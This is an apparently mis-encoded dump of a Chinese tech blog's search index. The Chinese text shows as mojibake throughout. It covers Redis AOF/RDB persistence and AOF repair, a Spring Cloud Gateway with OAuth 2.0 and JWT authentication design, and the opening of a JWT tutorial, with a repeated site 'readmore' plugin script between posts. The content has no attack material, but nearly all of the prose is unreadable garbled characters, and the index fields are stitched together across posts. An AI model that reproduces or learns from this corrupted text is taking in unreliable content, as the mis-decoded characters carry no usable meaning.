æ­¤åœ¨å†™å…¥è¿‡ç¨‹ä¸­å³ä½¿å‡ºç°ç£ç›˜ç©ºé—´å·²æ»¡ã€å®•æœºç­‰ç°è±¡ï¼Œä¹Ÿä¸ä¼šç ´åæ—¥å¿—æ–‡ä»¶ä¸­å·²ç»å­˜åœ¨çš„å†…å®¹ã€‚è€Œä¸”å¦‚æœæœ¬æ¬¡æ“ä½œåªæ˜¯å†™å…¥äº†ä¸€åŠæ•°æ®å°±å‡ºç°äº†ç³»ç»Ÿå´©æºƒé—®é¢˜ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒï¼Œåœ¨ Redis ä¸‹ä¸€æ¬¡å¯åŠ¨ä¹‹å‰ï¼Œå¯ä»¥é€šè¿‡ redis-check-aof å·¥å…·æ¥ä¿®å¤æ•°æ®ä¸€è‡´æ€§é—®é¢˜ Redis å¯ä»¥åœ¨ AOF æ–‡ä»¶ä½“ç§¯å˜å¾—è¿‡å¤§æ—¶ï¼Œè‡ªåŠ¨åœ°åœ¨åå°å¯¹ AOF æ–‡ä»¶è¿›è¡Œé‡å†™ï¼Œé‡å†™åçš„æ–° AOF æ–‡ä»¶åŒ…å«äº†æ¢å¤å½“å‰æ•°æ®é›†æ‰€éœ€çš„æœ€å°å‘½ä»¤é›†åˆã€‚ æ•´ä¸ªé‡å†™æ“ä½œæ˜¯ç»å¯¹å®‰å…¨çš„ï¼Œå› ä¸º Redis åœ¨åˆ›å»ºæ–° AOF æ–‡ä»¶çš„è¿‡ç¨‹ä¸­ï¼Œä¼šç»§ç»­å°†å‘½ä»¤è¿½åŠ åˆ°ç°æœ‰çš„ AOF æ–‡ä»¶é‡Œé¢ï¼Œå³ä½¿é‡å†™è¿‡ç¨‹ä¸­å‘ç”Ÿå®•æœºï¼Œç°æœ‰çš„ AOF æ–‡ä»¶ä¹Ÿä¸ä¼šä¸¢å¤±ã€‚ è€Œä¸€æ—¦æ–° AOF æ–‡ä»¶åˆ›å»ºå®Œæ¯•ï¼ŒRedis å°±ä¼šä»æ—§ AOF æ–‡ä»¶åˆ‡æ¢åˆ°æ–° AOF æ–‡ä»¶ï¼Œå¹¶å¼€å§‹å¯¹æ–° AOF æ–‡ä»¶è¿›è¡Œè¿½åŠ æ“ä½œ AOF æ–‡ä»¶æœ‰åºåœ°ä¿å­˜äº†å¯¹æ•°æ®åº“æ‰§è¡Œçš„æ‰€æœ‰å†™å…¥æ“ä½œï¼Œè¿™äº›å†™å…¥æ“ä½œä»¥ Redis åè®®çš„æ ¼å¼ä¿å­˜ï¼Œå› æ­¤ AOF æ–‡ä»¶çš„å†…å®¹éå¸¸å®¹æ˜“è¢«äººè¯»æ‡‚ï¼Œå¯¹æ–‡ä»¶è¿›è¡Œåˆ†æï¼ˆparseï¼‰ä¹Ÿå¾ˆè½»æ¾ã€‚ å¯¼å‡ºï¼ˆexportï¼‰ AOF æ–‡ä»¶ä¹Ÿéå¸¸ç®€å•ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœä¸å°å¿ƒæ‰§è¡Œäº† FLUSHALL å‘½ä»¤ï¼Œä½†åªè¦ AOF æ–‡ä»¶æœªè¢«é‡å†™ï¼Œé‚£ä¹ˆåªè¦åœæ­¢æœåŠ¡å™¨ï¼Œç§»é™¤ AOF æ–‡ä»¶æœ«å°¾çš„ FLUSHALL å‘½ä»¤ï¼Œå¹¶é‡å¯ Redisï¼Œå°±å¯ä»¥å°†æ•°æ®é›†æ¢å¤åˆ° FLUSHALL æ‰§è¡Œä¹‹å‰çš„çŠ¶æ€ AOF çš„ç¼ºç‚¹ å¯¹äºç›¸åŒçš„æ•°æ®é›†æ¥è¯´ï¼ŒAOF æ–‡ä»¶çš„ä½“ç§¯é€šå¸¸è¦å¤§äº RDB æ–‡ä»¶çš„ä½“ç§¯ï¼Œè€Œä¸” RDB åœ¨æ¢å¤å¤§æ•°æ®é›†æ—¶çš„é€Ÿåº¦æ¯” AOF çš„æ¢å¤é€Ÿåº¦è¦å¿« æ ¹æ®æ‰€ä½¿ç”¨çš„ fsync ç­–ç•¥ï¼ŒAOF çš„é€Ÿåº¦å¯èƒ½ä¼šæ…¢äº RDBã€‚AOF å¼€å¯åæ”¯æŒå†™çš„ QPS ä¼šæ¯” RDB æ”¯æŒçš„å†™çš„ QPS ä½ï¼Œä½†åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ¯ç§’ fsync çš„æ€§èƒ½ä¾ç„¶éå¸¸é«˜ï¼Œè€Œå…³é—­ fsync å¯ä»¥è®© AOF çš„é€Ÿåº¦å’Œ RDB ä¸€æ ·å¿«ï¼Œå³ä½¿åœ¨é«˜è´Ÿè·ä¹‹ä¸‹ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ä¸è¿‡åœ¨å¤„ç†å·¨å¤§çš„å†™å…¥è½½å…¥æ—¶ï¼ŒRDB å¯ä»¥æä¾›æ›´æœ‰ä¿è¯çš„æœ€å¤§å»¶è¿Ÿæ—¶é—´ï¼ˆlatencyï¼‰ ä¿®å¤é”™è¯¯çš„ AOF æ–‡ä»¶æœåŠ¡å™¨å¯èƒ½åœ¨ Redis æ­£åœ¨å¯¹ AOF æ–‡ä»¶è¿›è¡Œå†™å…¥æ—¶å®•æœºï¼Œå¦‚æœå®•æœºé€ æˆäº† AOF æ–‡ä»¶å‡ºé”™ï¼ˆcorruptï¼‰ï¼Œ é‚£ä¹ˆ Redis åœ¨é‡å¯æ—¶ä¼šæ‹’ç»è½½å…¥è¿™ä¸ª AOF æ–‡ä»¶ï¼Œä»è€Œç¡®ä¿æ•°æ®çš„ä¸€è‡´æ€§ä¸ä¼šè¢«ç ´åã€‚å½“å‘ç”Ÿè¿™ç§æƒ…å†µæ—¶ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹æ–¹æ³•æ¥ä¿®å¤å‡ºé”™çš„ AOF æ–‡ä»¶ï¼š ä¸ºç°æœ‰çš„ AOF æ–‡ä»¶åˆ›å»ºå¤‡ä»½æ–‡ä»¶ ä½¿ç”¨ Redis é™„å¸¦çš„ redis-check-aof å·¥å…·ï¼Œå¯¹åŸæ¥çš„ AOF æ–‡ä»¶è¿›è¡Œä¿®å¤ 1$ redis-check-aof --fix ä½¿ç”¨ diff -u å‘½ä»¤å¯¹æ¯”ä¿®å¤åçš„ AOF æ–‡ä»¶å’ŒåŸå§‹çš„ AOF å¤‡ä»½æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸¤ä¸ªæ–‡ä»¶ä¹‹é—´çš„ä¸åŒä¹‹å¤„ï¼Œæ­¤æ­¥éª¤ä¸ºå¯é€‰æ“ä½œ é‡å¯ Redis æœåŠ¡å™¨ï¼Œç­‰å¾…æœåŠ¡å™¨è½½å…¥ä¿®å¤åçš„ AOF æ–‡ä»¶ï¼Œå¹¶è¿›è¡Œæ•°æ®æ¢å¤ RDB å’Œ AOF å¯¹æ¯” å¦‚ä½•é€‰æ‹©ä½¿ç”¨å“ªç§æŒä¹…åŒ–æ–¹å¼ï¼Ÿ å¦‚æœéå¸¸å…³å¿ƒæ•°æ®çš„å®‰å…¨æ€§ï¼Œä½†ä»ç„¶å¯ä»¥æ‰¿å—æ•°åˆ†é’Ÿä»¥å†…çš„æ•°æ®ä¸¢å¤±ï¼Œé‚£ä¹ˆå¯ä»¥åªä½¿ç”¨ RDB æŒä¹…åŒ– ä¸æ¨èåªä½¿ç”¨ AOF æŒä¹…åŒ–ï¼Œå› ä¸ºå®šæ—¶ç”Ÿæˆ RDB å¿«ç…§ï¼ˆsnapshotï¼‰éå¸¸ä¾¿äºè¿›è¡Œæ•°æ®åº“å¤‡ä»½ï¼Œå¹¶ä¸” RDB æ¢å¤æ•°æ®é›†çš„é€Ÿåº¦ä¹Ÿè¦æ¯” AOF æ¢å¤çš„é€Ÿåº¦è¦å¿« å¦‚æœæƒ³è¾¾åˆ°è¶³ä»¥åª²ç¾ PostgreSQL çš„æ•°æ®å®‰å…¨æ€§ï¼Œåˆ™åº”è¯¥åŒæ—¶ä½¿ç”¨ä¸¤ç§æŒä¹…åŒ–æœºåˆ¶ã€‚å½“åŒæ—¶ä½¿ç”¨ RDB å’Œ AOF ä¸¤ç§æŒä¹…åŒ–æœºåˆ¶æ—¶ï¼Œé‚£ä¹ˆåœ¨ Redis é‡å¯çš„æ—¶å€™ï¼Œä¼šä¼˜å…ˆä½¿ç”¨ AOF æ¥é‡å»ºæ•°æ®é›†ï¼Œå› ä¸º AOF çš„æ•°æ®æ›´åŠ å®Œæ•´ æ€»ç»“ï¼Œç”Ÿäº§ç¯å¢ƒä¸­æ¨èåŒæ—¶ä½¿ç”¨ AOF å’Œ RDB ä¸¤ç§æŒä¹…åŒ–æœºåˆ¶ï¼Œç”¨ AOF æ¥ä¿è¯æ•°æ®ä¸ä¸¢å¤±ï¼Œä½œä¸ºæ¢å¤æ•°æ®çš„ç¬¬ä¸€é€‰æ‹©ï¼›ç”¨ RDB æ¥åšä¸åŒç¨‹åº¦çš„å†·å¤‡ï¼Œåœ¨ AOF æ–‡ä»¶éƒ½ä¸¢å¤±æˆ–æŸåä¸å¯ç”¨çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ RDB è¿›è¡Œå¿«é€Ÿçš„æ•°æ®æ¢å¤ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç¼“å­˜"},{title:"Gateway + Security + OAuth 2.0 + JWT å®ç°ç»Ÿä¸€çš„è®¤è¯æˆæƒ",url:"/posts/2cb9090c.html",text:'1ã€å‰è¨€1.1ã€OAuth 2.0 ä»‹ç» OAuth 2.0 ç‰¹æ€§ä¸ä»‹ç» 1.2ã€OAuth 2.0 ä¸ JWT çš„å…³ç³» OAuth 2.0 æ˜¯ä¸€ç§è®¤è¯æˆæƒçš„åè®®è§„èŒƒ JWT æ˜¯åŸºäº Token çš„å®‰å…¨è®¤è¯åè®®çš„å®ç° OAuth 2.0 çš„è®¤è¯æœåŠ¡å™¨ç­¾å‘çš„ Token å¯ä»¥ä½¿ç”¨ JWT æ¥å®ç°ï¼ŒJWT è½»é‡ä¸”å®‰å…¨ã€‚ 1.3ã€åŸºäº OAuth 2.0 è®¤è¯æˆæƒçš„æ¡†æ¶OAuth çš„å®˜ç½‘æä¾›äº†å¾ˆå¤šå¼€å‘æ¡†æ¶ï¼Œåˆ†ä¸ºæœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯ï¼Œå…¶ä¸­æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½æ”¯æŒçš„ Java æ¡†æ¶æœ‰å››ä¸ªï¼šApache Oltuã€Spring Security OAuthã€Restlet Frameworkã€Keycloakã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒKeycloak ä¸ºç°ä»£åº”ç”¨å’Œåˆ†å¸ƒå¼æœåŠ¡æä¾›äº†ä¸€å¥—å®Œæ•´çš„è®¤è¯æˆæƒç®¡ç†å¼€æºè§£å†³æ–¹æ¡ˆï¼Œæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è®¤è¯æˆæƒæœåŠ¡å™¨ï¼›ä¸»è¦æ˜¯åŸºäº OAuth 2.0 åè®®å®ç°ï¼ŒåŒæ—¶æä¾›äº†å¤šç§è¯­è¨€åº“ï¼Œå¯ä»¥å¾ˆå¿«é€Ÿåœ°æ ¹æ®ä¸šåŠ¡éœ€æ±‚å°† Keycloak é›†æˆåˆ°ä¼ä¸šé¡¹ç›®ä¸­å»ä½¿ç”¨ã€‚ 2ã€Gateway + Security + OAuth 2.0 + Knife4j2.1ã€è®¤è¯æˆæƒæµç¨‹ ç”¨æˆ·æºå¸¦è´¦å·å¯†ç é€šè¿‡ç½‘å…³æœåŠ¡è¯·æ±‚è®¤è¯æœåŠ¡ è®¤è¯é€šè¿‡åï¼ŒæˆæƒæœåŠ¡é¢å‘èº«ä»½ä»¤ç‰Œç»™å®¢æˆ·ç«¯ï¼Œå¹¶å°†èº«ä»½ä»¤ç‰Œå‚¨å­˜åœ¨ Redis/MySQL ä¸­ ç”¨æˆ·æºå¸¦èº«ä»½ä»¤ç‰Œè¯·æ±‚èµ„æºæœåŠ¡ï¼ˆå¾®æœåŠ¡åº”ç”¨ï¼‰ï¼Œå¿…ç»ç½‘å…³æœåŠ¡ ç½‘å…³æœåŠ¡è·å–å®¢æˆ·ç«¯å¸¦æ¥çš„ä»¤ç‰Œå’Œ Redis/MySQL ä¸­çš„ä»¤ç‰Œè¿›è¡Œæ¯”å¯¹æ ¡éªŒ ç½‘å…³æœåŠ¡æ ¡éªŒé€šè¿‡åï¼Œè½¬å‘ HTTP è¯·æ±‚ï¼Œèµ„æºæœåŠ¡ï¼ˆå¾®æœåŠ¡åº”ç”¨ï¼‰è·å–åˆ°èº«ä»½ä»¤ç‰Œï¼Œè¿›è¡Œèº«ä»½æ ¡éªŒå’Œé‰´æƒï¼Œé€šè¿‡åå¤„ç†ç³»ç»Ÿä¸šåŠ¡ èµ„æºæœåŠ¡ï¼ˆå¾®æœåŠ¡åº”ç”¨ï¼‰å°†å“åº”æ•°æ®è¿”å›ç»™å®¢æˆ·ç«¯ æç¤ºï¼šGateway æ ¡éªŒå¹¶è§£æå¤–éƒ¨ä¼ é€’è¿‡æ¥çš„èº«ä»½ä»¤ç‰Œåï¼Œå¯ä»¥è·å–åˆ°ç”¨æˆ·ä¿¡æ¯ï¼ˆèº«ä»½ + æƒé™ï¼‰ï¼Œå¹¶å°†ç”¨æˆ·ä¿¡æ¯å†™å…¥åˆ° HTTP Header é‡Œï¼Œè®©åç»­çš„å¾®æœåŠ¡å¯ä»¥æ–¹ä¾¿åœ°å¾—åˆ°ç”¨æˆ·ä¿¡æ¯ 2.2ã€åº”ç”¨æ¶æ„è®¾è®¡12345â”œâ”€â”€ common åŸºç¡€æ¨¡å—â”œâ”€â”€ eureka æ³¨å†Œä¸­å¿ƒæ¨¡å—â”œâ”€â”€ gateway ç½‘å…³æ¨¡å—ï¼Œè´Ÿè´£æ ¡éªŒè®¤è¯ï¼ˆTokenï¼‰ã€è¯·æ±‚è½¬å‘ã€ç»Ÿä¸€è§£æç”¨æˆ·ä¿¡æ¯â”œâ”€â”€ shop ä¸šåŠ¡æ¨¡å—ï¼Œè´Ÿè´£æ ¡éªŒè®¤è¯ï¼ˆTokenï¼‰ ã€é‰´æƒâ””â”€â”€ auth è®¤è¯æ¨¡å—ï¼Œè´Ÿè´£ç”¨æˆ·çš„Oauth2.0è®¤è¯æˆæƒï¼ŒåŸºäºMySQLå­˜å‚¨ è®¤è¯æœåŠ¡è´Ÿè´£è®¤è¯å’Œæˆæƒï¼Œç½‘å…³æœåŠ¡åªè´Ÿè´£æ ¡éªŒè®¤è¯ï¼ˆTokenï¼‰ã€è¯·æ±‚è½¬å‘å’Œç»Ÿä¸€è§£æç”¨æˆ·ä¿¡æ¯ï¼Œä¸šåŠ¡æ¨¡å—è´Ÿè´£æ ¡éªŒè®¤è¯ï¼ˆTokenï¼‰å’Œé‰´æƒã€‚ç”±äº gatewayã€shop æ¨¡å—æ²¡æœ‰ä½¿ç”¨ MySQL å­˜å‚¨ï¼Œæš‚æ—¶æ— æ³•å®ç°æ³¨é”€ Token çš„åŠŸèƒ½ï¼›è‹¥ä¸¤è€…éƒ½å¼•å…¥ MySQL å­˜å‚¨ï¼Œæ„Ÿè§‰åº”ç”¨æœ‰ç‚¹é‡ï¼ˆä¾èµ– ORM æ¡†æ¶ï¼Œè€Œä¸”å¯èƒ½å‡ºç°å¤šæ•°æ®æºçš„åœºæ™¯ï¼‰ï¼Œæˆ–è€…éœ€è¦ä½¿ç”¨ Redis å­˜å‚¨æ¥æ›¿ä»£ MySQL å­˜å‚¨ã€‚ç»ˆä¸Šæ‰€è¿°ï¼Œå¦‚æœä¸è€ƒè™‘æä¾›æ³¨é”€ Token çš„åŠŸèƒ½ï¼Œè¯¥æ–¹æ¡ˆè¿˜æ˜¯å¯ä»¥æ¥å—çš„ã€‚ 2.3ã€ä¸‹è½½æ¡ˆä¾‹ä»£ç  Gateway + Security + OAuth 2.0 + Knife4j æ•´åˆæ¡ˆä¾‹ä»£ç ä¸‹è½½ 3ã€Gateway + Security + OAuth 2.0 + JWT3.1ã€åº”ç”¨æ¶æ„è®¾è®¡123â”œâ”€â”€ micro-oauth2-api å—ä¿æŠ¤çš„APIæœåŠ¡ï¼Œç”¨æˆ·è¢«ç½‘å…³æœåŠ¡é‰´æƒé€šè¿‡åå¯ä»¥è®¿é—®è¯¥æœåŠ¡ï¼Œä¸æ•´åˆSpring Security + Oauth2.0â”œâ”€â”€ micro-oauth2-auth Oauth2.0è®¤è¯æœåŠ¡ï¼Œè´Ÿè´£å¯¹ç™»å½•ç”¨æˆ·è¿›è¡Œè®¤è¯æˆæƒï¼Œæ•´åˆSpring Security + Oauth2.0ï¼ŒåŸºäºRediså­˜å‚¨â””â”€â”€ micro-oauth2-gateway ç½‘å…³æœåŠ¡ï¼Œè´Ÿè´£æ ¡éªŒè®¤è¯ï¼ˆTokenï¼‰ã€é‰´æƒå’Œè¯·æ±‚è½¬å‘ç­‰ï¼Œæ•´åˆSpring Security + Oauth2ï¼ŒåŸºäºRediså­˜å‚¨ è®¤è¯æœåŠ¡è´Ÿè´£è®¤è¯å’Œæˆæƒï¼Œç½‘å…³è´Ÿè´£æ ¡éªŒè®¤è¯ï¼ˆTokenï¼‰å’Œé‰´æƒï¼Œå…¶ä»– API æœåŠ¡åˆ™åªè´Ÿè´£å¤„ç†è‡ªå·±çš„ä¸šåŠ¡é€»è¾‘ã€‚å®‰å…¨ç›¸å…³çš„é€»è¾‘åªå­˜åœ¨äºè®¤è¯æœåŠ¡å’Œç½‘å…³æœåŠ¡ä¸­ï¼Œå…¶ä»– API æœåŠ¡åªæ˜¯å•çº¯åœ°æä¾›æœåŠ¡è€Œæ²¡æœ‰ä»»ä½•å®‰å…¨ç›¸å…³é€»è¾‘ã€‚è¿™ç§åº”ç”¨æ¶æ„è¦æ±‚æ‰€æœ‰ HTTP è¯·æ±‚éƒ½å¿…é¡»ç»è¿‡ç½‘å…³æœåŠ¡ï¼ŒåŒæ—¶ä»»ä½• API æœåŠ¡éƒ½ä¸èƒ½æš´éœ²åœ¨å¤–ç½‘ï¼Œå¦åˆ™ä¼šå­˜åœ¨æå¤§çš„å®‰å…¨éšæ‚£ã€‚ 3.2ã€ä¸‹è½½æ¡ˆä¾‹ä»£ç  Gateway + Security + OAuth 2.0 + JWT æ•´åˆæ¡ˆä¾‹ä»£ç ä¸‹è½½ 4ã€å»¶ä¼¸å†…å®¹4.1ã€Knife4j æ•´åˆ OAuth 2.0 Knife4j æ•´åˆ OAuth 2.0 4.2ã€ç½‘å…³æ˜¯å¦é€‚åˆè¿›è¡Œè®¤è¯ä¸é‰´æƒ ç¬¬ä¸€æ´¾ç³»ï¼šç½‘å…³ä¸é€‚åˆè¿›è¡Œä¸šåŠ¡æ“ä½œï¼Œæ‰€ä»¥åšä¸ªç®€å•çš„å» Redis æ¯”è¾ƒ Token æ ¡éªŒæ˜¯æ­£ç¡®æ€è·¯ï¼Œå‰©ä¸‹çš„äº¤ç»™åç»­çš„æœåŠ¡åš ä¼˜ç‚¹ï¼šä¸ç”¨åœ¨ç½‘å…³æœåŠ¡å¼•å…¥å¤šä½™çš„ Spring Securityã€ORM æ¡†æ¶ ç¼ºç‚¹ï¼šç¬¬äºŒæ´¾ç³»çš„ä¼˜ç‚¹ ç¬¬äºŒæ´¾ç³»ï¼š ç½‘å…³ç”¨æ¥è®¤è¯ä¸é‰´æƒï¼Œç™»å½•è¹¦ä¸è¹¦å·²ç»ä¸æ˜¯é—®é¢˜äº†ï¼Œæ¯•ç«Ÿç½‘å…³å®•æœºï¼Œä»£è¡¨ç³»ç»Ÿç˜«ç—ªäº† ä¼˜ç‚¹ï¼šæƒé™æ–¹é¢çš„ä»£ç ä¼šå¾ˆå¥½å†™ï¼Œæ§åˆ¶ URL å³å¯ ç¼ºç‚¹ï¼šç¬¬ä¸€æ´¾ç³»çš„ä¼˜ç‚¹ ç¬¬ä¸‰æ´¾ç³»ï¼š ç½‘å…³ç”¨æ¥è®¤è¯ä¸é‰´æƒï¼Œä½†é‰´æƒæ‰€éœ€çš„æ•°æ®ï¼ˆç”¨æˆ·ã€è§’è‰²ã€æƒé™ï¼‰ä» Caffeine + Redis ç¼“å­˜ä¸­åŠ è½½ï¼Œè€Œè®¤è¯æˆæƒæœåŠ¡å¯åŠ¨æ—¶ï¼Œè´Ÿè´£å°† MySQL ä¸­æƒé™ç›¸å…³çš„æ•°æ®æå‰åŠ è½½åˆ° Redis ä¼˜ç‚¹ï¼šç¬¬ä¸€ä¸ç¬¬äºŒæ´¾ç³»çš„ä¼˜ç‚¹ ç¼ºç‚¹ï¼šä¸¥é‡ä¾èµ– Redisï¼Œä¸€èˆ¬éœ€è¦éƒ¨ç½²ç»´æŠ¤ Redis é›†ç¾¤ï¼Œå¦‚æœ Redis é›†ç¾¤å®•æœºï¼Œå¯èƒ½ä¼šé€ æˆç½‘å…³é‰´æƒåŠŸèƒ½ä¸å¯ç”¨æˆ–è€…ç³»ç»Ÿç˜«ç—ª 4.3ã€åŸºäº HTTP Header ä¼ é€’ç”¨æˆ·ä¿¡æ¯çš„ç¼ºç‚¹åŸºäº Spring Cloud çš„æŠ€æœ¯ä½“ç³»ï¼ˆRESTful æ¥å£è§„èŒƒï¼‰ï¼ŒGateway æ ¡éªŒå¹¶è§£æå¤–éƒ¨ä¼ é€’è¿‡æ¥çš„ Access Token åï¼Œè·å–åˆ°ç”¨æˆ·ä¿¡æ¯ï¼ˆèº«ä»½ + æƒé™ï¼‰ï¼ŒåŒæ—¶å°†ç”¨æˆ·ä¿¡æ¯å†™å…¥åˆ° HTTP Header é‡Œï¼Œè®©åé¢çš„ä¸šåŠ¡ç³»ç»Ÿæ¥æ”¶åˆ° Gateway è½¬å‘è¿‡æ¥çš„è¯·æ±‚åï¼Œä¹Ÿèƒ½ä» HTTP Header é‡Œå¾—åˆ°ç›¸åº”çš„ç”¨æˆ·ä¿¡æ¯ã€‚ä½†è¿™ç§æ–¹å¼å¯¹ä½¿ç”¨äº† RPC è°ƒç”¨çš„åœºæ™¯ä¸é€‚ç”¨ï¼Œå› ä¸ºåœ¨ RPC è°ƒç”¨é‡Œï¼Œæ— æ³•ä» HTTP Header è·å–åˆ°ä»»ä½•æ•°æ®ï¼Œè¯¥é—®é¢˜çš„è®¨è®ºå¯ä»¥å…³æ³¨è¿™é‡Œã€‚ 5ã€å‚è€ƒåšå®¢ API ç½‘å…³è®¤è¯æˆæƒ OAuth 2.0 çš„ Java å„ç±»é…ç½®ä¸ä½¿ç”¨åœºæ™¯ FAQ Spring Cloud Gateway + Security + OAuth 2.0 æ­å»ºå¾®æœåŠ¡ç»Ÿä¸€è®¤è¯æˆæƒ Spring Cloud Gateway + Security + OAuth 2.0 + JWT å®ç°å¾®æœåŠ¡ç»Ÿä¸€è®¤è¯é‰´æƒ Spring Cloud Gateway + Security + OAuth 2.0 + JWT é›†æˆç»Ÿä¸€è®¤è¯æˆæƒå¹³å°ä¸‹å®ç°æ³¨é”€ä½¿ JWT å¤±æ•ˆæ–¹æ¡ˆ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡ oauth"},{title:"JWT åŸºç¡€ä½¿ç”¨æ•™ç¨‹",url:"/posts/1b9bb05b.html",text:'JWT æ¦‚è¿°JSON Web Tokenï¼ˆJWTï¼‰æ˜¯ç›®å‰æœ€æµè¡Œçš„è·¨åŸŸèº«ä»½éªŒè¯è§£å†³æ–¹æ¡ˆã€‚ ä¼ ç»Ÿçš„èº«ä»½éªŒè¯ ç”¨æˆ·å‘æœåŠ¡å™¨å‘é€ç”¨æˆ·åå’Œå¯†ç  éªŒè¯æœåŠ¡å™¨åï¼Œç›¸å…³æ•°æ®ï¼ˆå¦‚ç”¨æˆ·è§’è‰²ï¼Œç™»å½•æ—¶é—´ç­‰ï¼‰å°†ä¿å­˜åœ¨å½“å‰ä¼šè¯ä¸­ æœåŠ¡å™¨å‘ç”¨æˆ·è¿”å› session_idï¼ŒSession ä¿¡æ¯éƒ½ä¼šå†™å…¥åˆ°ç”¨æˆ·çš„ Cookie ä¸­ ç”¨æˆ·çš„æ¯ä¸ªåç»­è¯·æ±‚éƒ½å°†é€šè¿‡åœ¨ Cookie ä¸­å–å‡º session_id å¹¶ä¼ é€’ç»™æœåŠ¡å™¨ æœåŠ¡å™¨æ”¶åˆ° session_id å¹¶å¯¹æ¯”ä¹‹å‰ä¿å­˜çš„æ•°æ®ï¼Œç¡®è®¤ç”¨æˆ·çš„èº«ä»½ è¿™ç§æ¨¡å¼æœ€å¤§çš„é—®é¢˜æ˜¯ï¼Œæ²¡æœ‰åˆ†å¸ƒå¼æ¶æ„ï¼Œæ— æ³•æ”¯æŒæ¨ªå‘æ‰©å±•ã€‚å¦‚æœä½¿ç”¨ä¸€ä¸ªæœåŠ¡å™¨ï¼Œè¯¥æ¨¡å¼å®Œå…¨æ²¡æœ‰é—®é¢˜ã€‚ä½†æ˜¯ï¼Œå¦‚æœå®ƒæ˜¯æœåŠ¡å™¨ç¾¤é›†æˆ–é¢å‘æœåŠ¡çš„è·¨åŸŸä½“ç³»ç»“æ„çš„è¯ï¼Œåˆ™éœ€è¦ä¸€ä¸ªç»Ÿä¸€çš„ Session æ•°æ®åº“ï¼ˆRedisï¼‰æ¥ä¿å­˜ä¼šè¯æ•°æ®å®ç°å…±äº«ï¼Œå¦‚æœä¿å­˜ Session çš„æ•°æ®åº“ï¼ˆRedisï¼‰æŒ‚æ‰ï¼Œæ•´ä¸ªè®¤è¯ä½“ç³»éƒ½ä¼šæŒ‚æ‰ã€‚ JWT çš„èº«ä»½éªŒè¯JWT çš„åŸåˆ™æ˜¯åœ¨æœåŠ¡å™¨èº«ä»½éªŒè¯ä¹‹åï¼Œå°†ç”Ÿæˆä¸€ä¸ª JSON å¯¹è±¡å¹¶å°†å…¶å‘é€ç»™ç”¨æˆ·ã€‚ä¹‹åï¼Œå½“ç”¨æˆ·ä¸æœåŠ¡å™¨é€šä¿¡æ—¶ï¼Œå®¢æˆ·åœ¨è¯·æ±‚ä¸­å¸¦ä¸Š JSON å¯¹è±¡ï¼ŒæœåŠ¡å™¨ä»…ä¾èµ–äºè¿™ä¸ª JSON å¯¹è±¡æ¥æ ‡è¯†ç”¨æˆ·ã€‚ä¸ºäº†é˜²æ­¢ç”¨æˆ·ç¯¡æ”¹æ•°æ®ï¼ŒæœåŠ¡å™¨å°†åœ¨ç”Ÿæˆå¯¹è±¡æ—¶æ·»åŠ ç­¾åã€‚æœåŠ¡å™¨ä¸ä¿å­˜ä»»ä½•ä¼šè¯æ•°æ®ï¼Œå³æœåŠ¡å™¨å˜ä¸ºæ— çŠ¶æ€ï¼Œä½¿å…¶æ›´å®¹æ˜“æ‰©å±•ã€‚å…·ä½“çš„èº«ä»½éªŒè¯æµç¨‹å¦‚ä¸‹ï¼š ç”¨æˆ·å‘èµ·ç™»å½•è¯·æ±‚ï¼Œè¯·æ±‚è®¤è¯æœåŠ¡ è®¤è¯æœåŠ¡æˆåŠŸè®¤è¯åï¼Œç”Ÿæˆ JWT ä»¤ç‰Œï¼Œå¹¶å°† JWT ä»¤ç‰Œå†™å…¥åˆ°ç”¨æˆ·çš„ Cookie ç”¨æˆ·è®¿é—® Web èµ„æºé¡µé¢ï¼Œå¸¦ç€ Cookie åˆ°ç½‘å…³æœåŠ¡ ç½‘å…³æœåŠ¡ä» Cookie è·å–å¹¶æ ¡éªŒç”¨æˆ·çš„ JWT ä»¤ç‰Œï¼Œå¦‚æœ JWT ä»¤ç‰Œæœ‰æ•ˆå¦åˆ™æ”¾è¡Œè¯·æ±‚ ç”¨æˆ·æ³¨é”€ç™»å½•ï¼Œè¯·æ±‚è®¤è¯æœåŠ¡ï¼Œåˆ é™¤ç”¨æˆ· Cookie ä¸­çš„ JWT ä»¤ç‰Œ JWT ä¸ ä¼ ç»Ÿèº«ä»½éªŒè¯æ¯”è¾ƒJWT å’Œä¼ ç»Ÿçš„ Cookie/Session ä¼šè¯ç®¡ç†ç›¸æ¯”è¾ƒæœ‰ç€å¤šæ–¹é¢çš„ä¼˜åŠ¿ï¼Œå› ä¸º Cookie/Session éœ€è¦åœ¨ Web æœåŠ¡å™¨çš„ Session 